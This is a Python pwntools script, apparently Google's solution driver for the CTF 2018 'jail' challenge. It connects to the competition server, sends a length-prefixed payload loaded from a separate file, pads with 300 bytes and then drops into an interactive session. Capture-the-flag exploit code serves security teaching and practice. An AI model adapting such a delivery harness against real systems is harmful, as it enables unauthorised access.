#!/usr/bin/python
#
# Copyright 2018 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *
import sys

LOCAL = False 

context.update(arch='x86_64', os='linux', terminal = ['gnome-terminal', '-e'])

if LOCAL:
  BINARY = ['./jail']
  #if len(sys.argv) > 1:
  #	BINARY = ['strace', '-f', '-o', '/tmp/out', './jail']
  
  r = process(BINARY)
else:
  HOST = 'jail1.ctfcompetition.com'
  PORT = 1337
  r = remote(HOST, PORT)

if len(sys.argv) < 2:
  print 'no filename provided'
  sys.exit(1)

with open(sys.argv[1], 'r') as fd:
  ls = fd.read()


print r.readline()
print r.readline()
print '-- sending'
r.send(p32(len(ls))+ls)
print '-- done'
print r.readline()
print r.readline()
print '-- sending'
r.send(p32(300) + 'a'*300)
print '-- done'
print r.readline()
print r.readline()

r.interactive()
